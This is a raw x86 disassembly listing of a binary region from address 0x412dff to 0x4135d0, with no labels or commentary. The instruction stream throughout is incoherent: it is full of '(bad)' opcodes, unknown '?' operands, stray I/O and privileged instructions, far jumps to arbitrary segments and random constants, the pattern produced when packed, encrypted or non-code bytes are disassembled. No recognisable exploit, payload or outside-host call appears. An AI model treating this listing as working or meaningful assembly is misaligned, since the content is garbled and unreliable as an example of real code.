  412dff:	xchg   DWORD PTR [edi],edi
  412e01:	mov    ch,BYTE PTR [eax-0x34a42c7e]
  412e07:	and    eax,ebx
  412e09:	mov    ah,0x7d
  412e0b:	bound  ebx,QWORD PTR [edx-0x17950de1]
  412e11:	inc    ecx
  412e13:	or     BYTE PTR [esi],0x35
  412e16:	sti    
  412e17:	sub    esp,edx
  412e19:	mov    cl,0x75
  412e1b:	test   dl,bh
  412e1d:	xchg   esi,eax
  412e1e:	mov    BYTE PTR [ebp+0x22b4e1d9],0xe0
  412e25:	call   0x9356:0xf65f01f
  412e2c:	and    al,0xf
  412e2e:	push   es
  412e2f:	sub    esi,edx
  412e31:	addr16 in eax,0x6e
  412e34:	arpl   cx,sp
  412e36:	sbb    al,0xfa
  412e38:	mov    al,0xfd
  412e3a:	iret   
  412e3b:	cwde   
  412e3c:	xchg   edi,eax
  412e3d:	ins    DWORD PTR es:[edi],dx
  412e3e:	nop
  412e3f:	push   ds
  412e40:	dec    ebp
  412e41:	dec    ebp
  412e42:	les    edi,FWORD PTR [eax]
  412e44:	lds    eax,FWORD PTR [esi+eiz*2-0x42fceb7c]
  412e4b:	fwait
  412e4c:	jno    0x412eaa
  412e4e:	xor    eax,0x94ee89fb
  412e53:	aas    
  412e54:	and    DWORD PTR ds:0x450deab4,0x9dad56e3
  412e5e:	mov    edx,0xb782f20f
  412e63:	adc    eax,0x16430349
  412e68:	lods   al,BYTE PTR ds:[esi]
  412e69:	test   BYTE PTR [ebx+ebx*8+0x72],al
  412e6d:	sub    DWORD PTR [edi+ecx*4],ecx
  412e70:	and    bh,BYTE PTR [esp+edx*2+0x74]
  412e74:	sbb    eax,0x67ff8793
  412e79:	jno    0x412e96
  412e7b:	shl    DWORD PTR [esi+0x7a],1
  412e7e:	mov    ebx,0x759886c1
  412e83:	je     0x412eb8
  412e85:	dec    edx
  412e86:	xchg   edi,eax
  412e87:	sub    al,0x34
  412e89:	inc    esp
  412e8a:	stc    
  412e8b:	jb     0x412e8a
  412e8d:	add    DWORD PTR [ebp+0x58bec133],0xffffffcc
  412e94:	xchg   esp,eax
  412e95:	cmp    ah,al
  412e97:	jle    0x412f13
  412e99:	pop    ss
  412e9a:	sbb    dh,BYTE PTR [ebx+0xe]
  412e9d:	xor    eax,0xd592a09c
  412ea2:	imul   esp,DWORD PTR es:[ecx+0x572a2341],0xffffffd4
  412eaa:	daa    
  412eab:	or     BYTE PTR [edx-0x54],cl
  412eae:	orps   xmm5,XMMWORD PTR [edi-0x2]
  412eb2:	adc    DWORD PTR [ebp-0x5b],ebx
  412eb5:	gs xchg esp,eax
  412eb7:	dec    edx
  412eb8:	clc    
  412eb9:	retf   0x6f7f
  412ebc:	dec    ecx
  412ebd:	xchg   esp,eax
  412ebe:	psubb  mm5,QWORD PTR [esi]
  412ec1:	adc    DWORD PTR [ecx+0x1a0e6d94],esp
  412ec7:	add    al,BYTE PTR [edx+0x2823a83c]
  412ecd:	mov    ebx,0x89edaf4a
  412ed2:	mov    dh,BYTE PTR [edx-0x6c]
  412ed5:	add    ecx,DWORD PTR [esi-0x24e10ef9]
  412edb:	inc    ebx
  412edc:	mov    ?,esi
  412ede:	and    ah,BYTE PTR [ecx]
  412ee0:	arpl   WORD PTR [ebp+0x14fb25e8],di
  412ee6:	stos   BYTE PTR es:[edi],al
  412ee7:	xchg   edi,eax
  412ee8:	mov    ds:0xe8f0865f,al
  412eed:	shl    DWORD PTR [edx+0x24d04096],1
  412ef3:	inc    ebp
  412ef4:	and    BYTE PTR [esi-0xff40726],ah
  412efa:	rcl    eax,1
  412efc:	sub    al,0x73
  412efe:	mov    DWORD PTR [ecx],edx
  412f00:	cmp    al,0xf6
  412f02:	ins    BYTE PTR es:[edi],dx
  412f03:	loopne 0x412f0c
  412f05:	je     0x412e96
  412f07:	ja     0x412ef4
  412f09:	xchg   esi,eax
  412f0a:	cld    
  412f0b:	fsub   st(1),st
  412f0d:	xchg   ecx,eax
  412f0e:	jge    0x412f28
  412f10:	ror    BYTE PTR [ebp-0x4b],cl
  412f13:	dec    esi
  412f14:	repnz pop esi
  412f16:	(bad)  
  412f17:	hlt    
  412f18:	jo     0x412f6b
  412f1a:	inc    ecx
  412f1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f1c:	xor    bh,dh
  412f1e:	imul   edx,DWORD PTR [edx],0xffffffa0
  412f21:	cwde   
  412f22:	sahf   
  412f23:	jmp    0x412ef2
  412f25:	pop    esp
  412f26:	xor    BYTE PTR [eax+ebx*4-0x20],0x3f
  412f2b:	fs push edx
  412f2d:	sub    dh,cl
  412f2f:	mov    BYTE PTR [eax],ch
  412f31:	jbe    0x412f5c
  412f33:	pop    ecx
  412f34:	adc    esp,esp
  412f36:	lods   eax,DWORD PTR ds:[esi]
  412f37:	fst    DWORD PTR [esi-0x60e2ce46]
  412f3d:	cmp    BYTE PTR fs:[eax+0x20],dl
  412f41:	in     al,dx
  412f42:	push   esp
  412f43:	jne    0x412f3e
  412f45:	add    DWORD PTR [edi],ecx
  412f47:	cmp    ch,0x5
  412f4a:	dec    esi
  412f4b:	enter  0x3205,0x57
  412f4f:	(bad)  [ecx-0x69ba0f42]
  412f55:	aaa    
  412f56:	jge    0x412ede
  412f58:	in     al,0x8b
  412f5a:	ret    0xddb
  412f5d:	out    dx,eax
  412f5e:	and    al,0xfd
  412f60:	push   edi
  412f61:	pop    ebp
  412f62:	outs   dx,DWORD PTR ds:[esi]
  412f63:	gs jl  0x412faf
  412f66:	add    eax,0xf733660d
  412f6b:	mov    al,ds:0x1f732a44
  412f70:	add    esi,ebx
  412f72:	mov    eax,ds:0x98daf15c
  412f77:	sbb    al,BYTE PTR [edi+0x58]
  412f7a:	or     al,0xcb
  412f7c:	mov    ds:0xd2426200,eax
  412f81:	into   
  412f82:	adc    DWORD PTR [ebp+0x131d91e],eax
  412f88:	adc    ebp,DWORD PTR [esi+0x2547fcc5]
  412f8e:	pop    esp
  412f8f:	push   es
  412f90:	mov    al,0xb7
  412f92:	out    0xf2,eax
  412f94:	push   eax
  412f95:	mov    ecx,0xec735745
  412f9a:	std    
  412f9b:	xchg   edx,eax
  412f9c:	aaa    
  412f9d:	push   es
  412f9e:	std    
  412f9f:	mov    ch,BYTE PTR [edi+0x1b]
  412fa2:	test   DWORD PTR [edi-0x42],0x2b660086
  412fa9:	mov    eax,ds:0x9b439a09
  412fae:	dec    ecx
  412faf:	aas    
  412fb0:	test   DWORD PTR [ecx+0x37],esp
  412fb3:	xor    DWORD PTR [edi-0x14],0xed7fc598
  412fba:	sub    edx,DWORD PTR [edx]
  412fbc:	cld    
  412fbd:	dec    edx
  412fbe:	ror    dh,0x8
  412fc1:	sub    eax,0xfa8fc84b
  412fc6:	inc    ebx
  412fc7:	xor    bh,BYTE PTR [ebx]
  412fc9:	retf   
  412fca:	pop    ss
  412fcb:	sbb    cl,BYTE PTR [ebp+0x7f]
  412fce:	pop    ebx
  412fcf:	arpl   WORD PTR [eax-0x1f],cx
  412fd2:	jbe    0x413024
  412fd4:	aaa    
  412fd5:	add    eax,0xb657bfcc
  412fda:	lock mov ds:0x45b4998c,eax
  412fe0:	ss data16 in al,dx
  412fe3:	mov    al,0xda
  412fe5:	test   eax,0x22fdf41d
  412fea:	stos   BYTE PTR es:[edi],al
  412feb:	xlat   BYTE PTR ds:[ebx]
  412fec:	shl    DWORD PTR [eax],1
  412fee:	sbb    al,0xdc
  412ff0:	jle    0x41306f
  412ff2:	pop    ds
  412ff3:	cmp    dh,ch
  412ff5:	xor    edx,DWORD PTR [edx+edx*4+0x5d]
  412ff9:	data16 ins BYTE PTR es:[edi],dx
  412ffb:	hlt    
  412ffc:	dec    ebx
  412ffd:	jmp    0x96f07fe9
  413002:	push   ecx
  413003:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  413005:	push   ebx
  413006:	ins    BYTE PTR es:[edi],dx
  413007:	sar    DWORD PTR [edi-0x12],1
  41300a:	pop    esp
  41300b:	arpl   WORD PTR [ebp+0x18],si
  41300e:	test   al,0x16
  413010:	or     al,0x5e
  413012:	iret   
  413013:	mul    DWORD PTR [edi]
  413015:	ins    BYTE PTR es:[edi],dx
  413016:	jo     0x413097
  413018:	pop    edx
  413019:	das    
  41301a:	ret    
  41301b:	push   0x4f
  41301d:	mov    dh,0xc2
  41301f:	jl     0x413074
  413021:	push   edx
  413022:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413023:	imul   edx,DWORD PTR [esp+ebx*8+0x15],0xffffffb8
  413028:	adc    al,0x94
  41302a:	mov    edi,0xffee4200
  41302f:	outs   dx,BYTE PTR ds:[esi]
  413030:	inc    ebp
  413031:	fs pop ecx
  413033:	inc    ebp
  413034:	mov    DWORD PTR [edx+edx*4-0x39],eax
  413038:	aaa    
  413039:	inc    edi
  41303a:	gs cwde 
  41303c:	cmc    
  41303d:	dec    edx
  41303e:	mov    ch,0xb9
  413040:	or     al,0x38
  413042:	jge    0x413074
  413044:	push   ecx
  413045:	mov    dl,BYTE PTR [edx+0x37]
  413048:	jns    0x412fe2
  41304a:	enter  0xee95,0xe9
  41304e:	inc    ebp
  41304f:	inc    ebp
  413050:	(bad)  
  413051:	sahf   
  413052:	ja     0x413084
  413054:	jo     0x412fdd
  413056:	xor    DWORD PTR [esi-0x28],esi
  413059:	jle    0x413045
  41305b:	imul   esi,DWORD PTR [ebp+0xa],0x34
  41305f:	cmp    al,0x9b
  413061:	dec    edi
  413062:	test   DWORD PTR [edi],0x595adb99
  413068:	(bad)  
  413069:	cli    
  41306a:	pop    ss
  41306b:	add    DWORD PTR [edx],ecx
  41306d:	daa    
  41306e:	sub    DWORD PTR [eax-0x63],eax
  413071:	test   al,0xf6
  413073:	mov    ebp,0xbc2af0a8
  413078:	clc    
  413079:	shr    dl,1
  41307b:	les    edi,FWORD PTR [esi-0x789c11b8]
  413081:	sub    al,0xd3
  413083:	(bad)  
  413084:	shr    DWORD PTR [esi+eax*1],1
  413087:	aad    0xa7
  413089:	fimul  WORD PTR [ecx]
  41308b:	aaa    
  41308c:	xor    BYTE PTR [edx+eiz*8+0x65],cl
  413090:	stos   BYTE PTR es:[edi],al
  413091:	mov    esi,0x7e6e75bd
  413096:	scas   eax,DWORD PTR es:[edi]
  413097:	sbb    al,0x93
  413099:	inc    ebp
  41309a:	ret    0x802d
  41309d:	leave  
  41309e:	push   ds
  41309f:	clc    
  4130a0:	rcl    DWORD PTR [ebp+0x67],0xff
  4130a4:	ins    DWORD PTR es:[edi],dx
  4130a5:	std    
  4130a6:	mov    ecx,0xcf76c96d
  4130ab:	xor    cl,BYTE PTR [edi+edx*2]
  4130ae:	mov    ecx,0xcbef9d0
  4130b3:	in     al,dx
  4130b4:	jp     0x4130e6
  4130b6:	push   edx
  4130b7:	repz dec ebx
  4130b9:	lock (bad) [edi+0x68c3554d]
  4130c0:	mov    al,fs:0xf651037
  4130c6:	pop    esp
  4130c7:	pop    edx
  4130c8:	sub    cl,BYTE PTR [esi+0x2]
  4130cb:	mov    eax,ds:0x722f7bc1
  4130d0:	ins    DWORD PTR es:[edi],dx
  4130d1:	cmp    esi,DWORD PTR ds:0xfc680f8
  4130d7:	lods   eax,DWORD PTR ds:[esi]
  4130d8:	mov    eax,ds:0xc0b4b3c0
  4130dd:	outs   dx,BYTE PTR ds:[esi]
  4130de:	out    0xbe,eax
  4130e0:	jae    0x4130c9
  4130e2:	test   eax,0x554c7263
  4130e7:	das    
  4130e8:	lods   eax,DWORD PTR ds:[esi]
  4130e9:	inc    ebx
  4130ea:	test   BYTE PTR [edi+ecx*1-0x42f7db2c],dh
  4130f1:	add    ch,BYTE PTR [edx-0x33abf7e]
  4130f7:	sar    BYTE PTR [edx-0x5bd28ccf],1
  4130fd:	out    0x75,al
  4130ff:	push   ebp
  413100:	inc    ebx
  413101:	pop    ebp
  413102:	mov    ds:0x7cbfa1b,eax
  413107:	ds (bad) 
  413109:	daa    
  41310a:	push   edx
  41310b:	adc    ch,cl
  41310d:	dec    ecx
  41310e:	inc    ecx
  41310f:	inc    esp
  413110:	retf   
  413111:	mov    edi,edx
  413113:	cmp    BYTE PTR [ebx+0x4faca9fe],al
  413119:	jg     0x4130a1
  41311b:	jg     0x4130c3
  41311d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41311e:	inc    ecx
  41311f:	sub    BYTE PTR [edi-0x1ff794ae],cl
  413125:	push   ebx
  413126:	add    DWORD PTR [ebx-0x6bcead3f],edi
  41312c:	add    DWORD PTR fs:[ecx+edx*8],0x20
  413131:	imul   eax,DWORD PTR [edx+0x61709085],0x8493a46a
  41313b:	(bad)  
  41313d:	cdq    
  41313e:	push   ebp
  41313f:	dec    ecx
  413140:	mov    ds:0xe6dbbce,eax
  413145:	lods   al,BYTE PTR ds:[esi]
  413146:	cmp    ecx,DWORD PTR [edi-0x1ab43508]
  41314c:	imul   ebp,DWORD PTR [ecx],0xbfd36706
  413152:	mov    edi,DWORD PTR ds:0x3209ff75
  413158:	add    ebp,esi
  41315a:	xchg   edx,eax
  41315b:	mov    eax,0xb955988d
  413160:	add    ah,BYTE PTR [ecx]
  413162:	mov    edi,0xd347283f
  413168:	push   edx
  413169:	js     0x4130eb
  41316b:	jecxz  0x41312d
  41316d:	cmp    al,dl
  41316f:	arpl   WORD PTR [ecx+0x28],bx
  413172:	and    al,0xe3
  413174:	adc    al,0xbe
  413176:	jmp    DWORD PTR [esi+0x4cd6badb]
  41317c:	loopne 0x4131bb
  41317e:	lds    edi,FWORD PTR [edi-0x77ca779c]
  413184:	mov    esi,edi
  413186:	mov    eax,ds:0xf54eadd2
  41318b:	aad    0x2e
  41318d:	pop    es
  41318e:	arpl   WORD PTR [edi+ecx*1+0x7caab14d],ax
  413195:	test   eax,0x6bcb37e0
  41319a:	mov    bl,0xa1
  41319c:	inc    edx
  41319d:	xchg   ebp,eax
  41319e:	xchg   ecx,eax
  41319f:	xchg   DWORD PTR [edi-0x1b1a2ece],esi
  4131a5:	mov    edi,0x33ec8fb1
  4131aa:	cmp    BYTE PTR [ecx+0x6f08ea81],cl
  4131b0:	pop    esp
  4131b1:	adc    BYTE PTR [esi-0x79],ah
  4131b4:	test   eax,0x81e031e6
  4131b9:	jae    0x4131ee
  4131bb:	dec    edi
  4131bc:	daa    
  4131bd:	popf   
  4131be:	out    dx,al
  4131bf:	pop    ecx
  4131c0:	ja     0x4131b4
  4131c2:	ret    0x8d34
  4131c5:	imul   edx,DWORD PTR [esi+0x84bd052],0xffffffa6
  4131cc:	cmp    al,0x7b
  4131ce:	xor    eax,0xbbe14880
  4131d3:	into   
  4131d4:	repnz xchg edi,eax
  4131d6:	repnz or BYTE PTR [eax+0x7d],bh
  4131da:	lea    edx,[eax+0x42]
  4131dd:	xor    eax,0x39475a45
  4131e2:	or     ah,cl
  4131e4:	xlat   BYTE PTR ds:[ebx]
  4131e5:	fdivrp st(1),st
  4131e7:	mov    ebp,0xe4ed3e42
  4131ec:	jmp    0x3019:0x329466f0
  4131f3:	jl     0x413244
  4131f5:	std    
  4131f6:	or     esi,DWORD PTR [ecx]
  4131f8:	repnz and DWORD PTR [edx+0x31],eax
  4131fc:	inc    edx
  4131fd:	mov    edx,0x3c547c07
  413202:	and    ebx,DWORD PTR [edx+0x5b]
  413205:	rcr    BYTE PTR [eax-0x6453956],0x8d
  41320c:	or     eax,0x58971781
  413211:	ins    DWORD PTR es:[edi],dx
  413212:	or     cl,BYTE PTR [ebp+0x24679b89]
  413218:	into   
  413219:	(bad)  
  41321a:	mov    ah,0x13
  41321c:	dec    edi
  41321d:	add    al,0x23
  41321f:	aas    
  413220:	pop    ss
  413221:	aas    
  413222:	mov    BYTE PTR [esi-0x37],dl
  413225:	inc    eax
  413226:	add    BYTE PTR [edi+0x6cf5973d],0xb
  41322d:	lock cld 
  41322f:	xor    edx,esp
  413231:	pushf  
  413232:	add    eax,0xbef1887a
  413237:	or     al,0x52
  413239:	outs   dx,DWORD PTR ds:[esi]
  41323a:	add    bh,BYTE PTR [ecx+0x19]
  41323d:	rcl    BYTE PTR [eax+eiz*4-0x5927e106],1
  413244:	call   DWORD PTR [eax-0x49c0e3fc]
  41324a:	clc    
  41324b:	jp     0x4132ab
  41324d:	mov    al,ds:0xcee35c53
  413252:	ds jmp 0x4132a4
  413255:	ins    BYTE PTR es:[edi],dx
  413256:	lods   eax,DWORD PTR ds:[esi]
  413257:	add    al,0x3d
  413259:	(bad)  
  41325b:	fnstenv [eax-0x2e]
  41325e:	imul   esi,ebx,0xf3154533
  413264:	adc    ebp,DWORD PTR [ebx+ebx*8+0x3410140f]
  41326b:	sub    al,0x6b
  41326d:	push   cs
  41326e:	sti    
  41326f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413270:	sub    dl,BYTE PTR [ecx]
  413272:	jl     0x4131fe
  413274:	jns    0x4132e4
  413276:	jb     0x41328f
  413278:	inc    ebx
  413279:	xlat   BYTE PTR ds:[ebx]
  41327a:	das    
  41327b:	xor    ch,cl
  41327d:	outs   dx,BYTE PTR ds:[esi]
  41327e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41327f:	sbb    BYTE PTR [esi-0x48],0xb8
  413283:	cmp    esi,DWORD PTR [edi]
  413285:	mov    ebx,0xe78b6e51
  41328a:	enter  0xe04d,0xe0
  41328e:	xchg   ebp,eax
  41328f:	leave  
  413290:	jp     0x41325d
  413292:	hlt    
  413293:	adc    BYTE PTR [edx-0x235577bc],ah
  413299:	add    eax,0x97165bcb
  41329e:	in     eax,0x68
  4132a0:	sbb    eax,0xe0ec05d3
  4132a5:	mov    esp,0x41912553
  4132aa:	adc    dh,BYTE PTR [ebx+0x61c9a106]
  4132b0:	call   0x1cf:0xa4dbd399
  4132b7:	in     eax,dx
  4132b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4132b9:	push   es
  4132ba:	and    al,0xef
  4132bc:	in     al,dx
  4132bd:	adc    WORD PTR [esi+0x116bf52d],di
  4132c4:	jae    0x413327
  4132c6:	out    dx,eax
  4132c7:	xor    esp,DWORD PTR [ebx+0x11ce4216]
  4132cd:	lock cwde 
  4132cf:	inc    edx
  4132d0:	aas    
  4132d1:	xchg   esp,eax
  4132d2:	add    dl,BYTE PTR [ecx+0x26]
  4132d5:	mov    fs,WORD PTR [edi]
  4132d7:	add    BYTE PTR [edx-0x577d3aab],ch
  4132dd:	stc    
  4132de:	lahf   
  4132df:	sti    
  4132e0:	push   esi
  4132e1:	loop   0x413266
  4132e3:	mov    ss,edx
  4132e5:	loope  0x41333b
  4132e7:	adc    al,0x35
  4132e9:	inc    edi
  4132ea:	push   ecx
  4132eb:	gs cmp eax,0x5b59a8ba
  4132f1:	push   eax
  4132f2:	ret    0xf205
  4132f5:	stos   BYTE PTR es:[edi],al
  4132f6:	out    dx,al
  4132f7:	fcomp  QWORD PTR [ebp-0x5fb24cb3]
  4132fd:	jne    0x413281
  4132ff:	pop    ecx
  413300:	add    eax,ecx
  413302:	leave  
  413303:	lods   eax,DWORD PTR ds:[esi]
  413304:	add    esp,edx
  413306:	jge    0x4132c1
  413308:	test   al,0x30
  41330a:	pop    es
  41330b:	mov    eax,ds:0xf727c61e
  413310:	xchg   edx,eax
  413311:	inc    edi
  413312:	sbb    bl,0x30
  413315:	cmp    dh,al
  413317:	or     BYTE PTR [ebx],dh
  413319:	mov    ds:0x87b967e6,eax
  41331e:	mov    ecx,0x108f48f5
  413323:	sub    BYTE PTR [eax-0x51],ah
  413326:	arpl   WORD PTR [ecx+0x2ed2b07c],ax
  41332c:	pop    esi
  41332d:	jne    0x41339c
  41332f:	cmp    eax,DWORD PTR [eax]
  413331:	leave  
  413332:	sbb    ebp,DWORD PTR [esi-0x7444fafd]
  413338:	jb     0x41334b
  41333a:	fcomp  QWORD PTR [ecx-0x3e]
  41333d:	lahf   
  41333e:	lock jbe 0x41339e
  413341:	cmp    ah,BYTE PTR [ebp+0x34]
  413344:	icebp  
  413345:	fucomp st(1)
  413347:	(bad)
  41334a:	xchg   edx,eax
  41334b:	into   
  41334c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41334d:	pop    edx
  41334e:	clc    
  41334f:	ins    DWORD PTR es:[edi],dx
  413350:	in     eax,0x6c
  413352:	mov    dh,0xdb
  413354:	test   DWORD PTR [ecx],edx
  413356:	cmp    al,0x14
  413358:	leave  
  413359:	cli    
  41335a:	imul   BYTE PTR [ebp+0xa]
  41335d:	push   es
  41335e:	int3   
  41335f:	pop    esi
  413360:	xchg   esi,eax
  413361:	ins    DWORD PTR es:[edi],dx
  413362:	push   es
  413363:	clc    
  413364:	sub    BYTE PTR [ebp+0x1bf5e6cb],bl
  41336a:	fdivrp st(7),st
  41336c:	in     eax,0x95
  41336e:	mov    ds:0x15751efd,al
  413373:	inc    edx
  413374:	outs   dx,BYTE PTR ds:[esi]
  413375:	iret   
  413376:	adc    al,0xdc
  413378:	xor    DWORD PTR [eax+0x3443a842],eax
  41337e:	xchg   edx,eax
  41337f:	pop    ecx
  413380:	test   BYTE PTR [eax+0x759a7eb3],dl
  413386:	mov    ebp,0xcf80da7d
  41338b:	push   ecx
  41338c:	jl     0x41337c
  41338e:	cld    
  41338f:	ins    BYTE PTR es:[edi],dx
  413390:	mov    esi,0x991257a4
  413395:	jmp    0xba04:0x20cb9df5
  41339c:	fisttp DWORD PTR [ecx+0x74f1fd4e]
  4133a2:	jl     0x41332c
  4133a4:	inc    esi
  4133a5:	in     al,dx
  4133a6:	inc    edx
  4133a7:	cmp    al,BYTE PTR [ecx-0x5cdcbc35]
  4133ad:	fisttp DWORD PTR [ecx]
  4133af:	jmp    0xf8ef:0x520e0c99
  4133b6:	mov    ds:0x646755c7,al
  4133bb:	mov    ebx,0xbb4eb227
  4133c0:	pushf  
  4133c1:	sbb    esp,DWORD PTR [ecx]
  4133c3:	nop
  4133c4:	mov    dh,0x60
  4133c6:	cmp    edx,ebx
  4133c8:	jbe    0x4133cb
  4133ca:	push   eax
  4133cb:	inc    esp
  4133cc:	xor    BYTE PTR [eax+ebp*4+0x6958e040],0xd4
  4133d4:	aas    
  4133d5:	fisub  WORD PTR [edi]
  4133d7:	xchg   ecx,eax
  4133d8:	adc    DWORD PTR [ebx+0x45],ebx
  4133db:	fwait
  4133dc:	push   edi
  4133dd:	(bad)  
  4133de:	hlt    
  4133df:	dec    esp
  4133e0:	xor    DWORD PTR [ebx],edi
  4133e2:	ret    
  4133e3:	inc    edx
  4133e4:	scas   eax,DWORD PTR es:[edi]
  4133e5:	sbb    al,0x1c
  4133e7:	fisub  WORD PTR [ebp-0x737282b1]
  4133ed:	jle    0x413442
  4133ef:	pop    esi
  4133f0:	xlat   BYTE PTR ds:[ebx]
  4133f1:	call   0xfd65a711
  4133f6:	jae    0x413431
  4133f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4133f9:	in     eax,dx
  4133fa:	aad    0x3e
  4133fc:	stos   BYTE PTR es:[edi],al
  4133fd:	cdq    
  4133fe:	(bad)  
  4133ff:	lds    edi,FWORD PTR [ebp-0x6bd2314e]
  413405:	adc    esp,DWORD PTR ds:0x7fcb2934
  41340b:	and    edi,DWORD PTR gs:[ecx-0x7f]
  41340f:	test   eax,0x4fcf674d
  413414:	mov    bl,0xc
  413416:	jns    0x41339d
  413418:	shl    ah,cl
  41341a:	lds    eax,FWORD PTR [edx+0x29c1af47]
  413420:	push   ebx
  413421:	cld    
  413422:	mov    eax,0x106b6f35
  413427:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413428:	or     BYTE PTR [eax-0x59be9f94],dl
  41342e:	jg     0x413493
  413430:	sbb    edx,ebp
  413432:	cmc    
  413433:	cmp    eax,DWORD PTR [esi]
  413435:	js     0x413420
  413437:	mov    eax,ds:0x355c44db
  41343c:	mov    edi,0x28e27f8d
  413441:	fstp   st(5)
  413443:	sub    esp,DWORD PTR [ebp*1+0x346ff0ba]
  41344a:	imul   ebx,DWORD PTR [edi+0x79],0xffffff86
  41344e:	enter  0xc0a1,0x3c
  413452:	adc    BYTE PTR [eax+0x5ec0f016],bl
  413458:	adc    BYTE PTR [ebp-0x2c],dl
  41345b:	enter  0xc81c,0xa7
  41345f:	fmul   QWORD PTR [edi+edi*2-0x56]
  413463:	in     al,dx
  413464:	add    eax,0x4791788f
  413469:	mov    edx,0xab2cbc52
  41346e:	push   ebx
  41346f:	inc    ebx
  413470:	out    0x7c,eax
  413472:	cdq    
  413473:	ins    DWORD PTR es:[edi],dx
  413474:	cmp    edx,0xefaff0f9
  41347a:	sub    eax,0x263860d0
  41347f:	in     al,dx
  413480:	jmp    DWORD PTR ds:0xfc133f66
  413486:	(bad)  
  413487:	push   ebx
  413488:	mov    WORD PTR cs:[esi-0x532b3427],cs
  41348f:	mov    ecx,0xc55f1eff
  413494:	sbb    al,0x17
  413496:	loop   0x4134ab
  413498:	test   eax,0xa8f329aa
  41349d:	cmp    BYTE PTR [esi+0x13],0xf0
  4134a1:	jl     0x413481
  4134a3:	iret   
  4134a4:	aas    
  4134a5:	popf   
  4134a6:	in     eax,0x72
  4134a8:	fnstcw WORD PTR [ebx-0x21afa1f2]
  4134ae:	aam    0x58
  4134b0:	(bad)  
  4134b1:	leave  
  4134b2:	jne    0x41352b
  4134b4:	mov    ebp,0x4d5fa13d
  4134b9:	outs   dx,BYTE PTR ds:[esi]
  4134ba:	dec    edi
  4134bb:	std    
  4134bc:	lds    ebp,FWORD PTR [ebx+eax*2]
  4134bf:	jle    0x413458
  4134c1:	mov    al,0x98
  4134c3:	loop   0x413502
  4134c5:	inc    ebx
  4134c6:	and    BYTE PTR [esi],0x99
  4134c9:	pop    edx
  4134ca:	nop
  4134cb:	pop    ebp
  4134cc:	dec    ecx
  4134cd:	(bad)  
  4134ce:	(bad)  
  4134cf:	aas    
  4134d0:	add    cl,BYTE PTR [esi-0xf084850]
  4134d6:	stos   BYTE PTR es:[edi],al
  4134d7:	pushf  
  4134d8:	jp     0x41351a
  4134da:	(bad)  
  4134db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4134dc:	icebp  
  4134dd:	jne    0x413465
  4134df:	(bad)
  4134e3:	push   edx
  4134e4:	inc    eax
  4134e5:	push   ds
  4134e6:	aad    0xa6
  4134e8:	dec    ebx
  4134e9:	retf   
  4134ea:	push   ecx
  4134eb:	xlat   BYTE PTR ds:[ebx]
  4134ec:	ins    BYTE PTR es:[edi],dx
  4134ed:	sub    DWORD PTR [ebp+0x20],ebp
  4134f0:	xchg   DWORD PTR [edi],edi
  4134f2:	add    al,0xb5
  4134f4:	loop   0x4134d5
  4134f6:	fisttp WORD PTR [ebx+ebp*1]
  4134f9:	mov    eax,esp
  4134fb:	and    eax,DWORD PTR [esi+0x6a9403b1]
  413501:	or     ebp,DWORD PTR [edi+0x72]
  413504:	cmp    DWORD PTR [ecx+0x3f2ca17f],0x845d17bb
  41350e:	and    al,0xc9
  413510:	je     0x413516
  413512:	(bad)  
  413513:	fnsave ds:0x888bc5b5
  413519:	sbb    al,0x6a
  41351b:	mov    ds:0x8e58e573,eax
  413520:	in     eax,dx
  413521:	sbb    al,0x8e
  413523:	sbb    BYTE PTR [ecx-0x77008be1],ch
  413529:	mov    WORD PTR [ebx+edx*2],es
  41352c:	(bad)  
  41352d:	out    0xc2,eax
  41352f:	mov    ah,0xe1
  413531:	mov    ss,WORD PTR [edi+0x5a]
  413534:	adc    DWORD PTR [edi+0x7a],esp
  413537:	xchg   BYTE PTR [ebp-0x708556ef],al
  41353d:	cmc    
  41353e:	dec    ebp
  41353f:	mov    ?,WORD PTR [esi+0x1d3c8a07]
  413545:	stos   BYTE PTR es:[edi],al
  413546:	xor    bl,BYTE PTR [ebx]
  413548:	pop    esp
  413549:	psadbw mm2,QWORD PTR [edi-0x1f685a45]
  413550:	xor    ecx,DWORD PTR [esp+ebp*1]
  413553:	ret    0x96fa
  413556:	xor    al,0xc2
  413558:	mov    dl,0xa8
  41355a:	imul   eax,DWORD PTR [ebp+0x58],0xffffff82
  41355e:	cli    
  41355f:	(bad)  
  413560:	mov    ah,0x15
  413562:	mov    ah,0xc3
  413564:	push   cs
  413565:	jnp    0x413512
  413567:	inc    edx
  413568:	sbb    eax,0x33ac9573
  41356d:	cmp    ecx,DWORD PTR ds:0x149d550d
  413573:	bound  edi,QWORD PTR [edi+ecx*8-0x61]
  413577:	fisttp QWORD PTR [esi-0x6a4b11fd]
  41357d:	add    eax,0x4e62e1b6
  413582:	cvtps2pi mm0,QWORD PTR [ebp-0x4]
  413586:	(bad)  
  413587:	xchg   edi,eax
  413588:	int3   
  413589:	psllq  mm7,QWORD PTR [esi+0x1f]
  41358d:	aam    0xec
  41358f:	dec    eax
  413590:	aam    0x6b
  413592:	jnp    0x41356c
  413594:	xor    BYTE PTR [ebx],dl
  413596:	mov    ebx,0xaa542b30
  41359b:	aad    0xd8
  41359d:	xchg   edi,eax
  41359e:	icebp  
  41359f:	sub    al,0xf0
  4135a1:	mov    ds:0x7aca2e64,al
  4135a6:	loopne 0x413591
  4135a8:	xor    eax,0xec535269
  4135ad:	in     eax,0xe6
  4135af:	ss push cs
  4135b1:	xor    DWORD PTR [eax+0x2b],edi
  4135b4:	and    bl,bh
  4135b6:	std    
  4135b7:	(bad)  
  4135b8:	jmp    0x41361d
  4135ba:	or     eax,0x71c95e08
  4135bf:	ins    BYTE PTR es:[edi],dx
  4135c0:	xchg   esi,eax
  4135c1:	mov    eax,0xd750eae6
  4135c6:	out    0x58,al
  4135c8:	push   ds
  4135c9:	test   al,0x46
  4135cb:	pop    edx
  4135cc:	enter  0xb00d,0x60
  4135d0:	icebp  
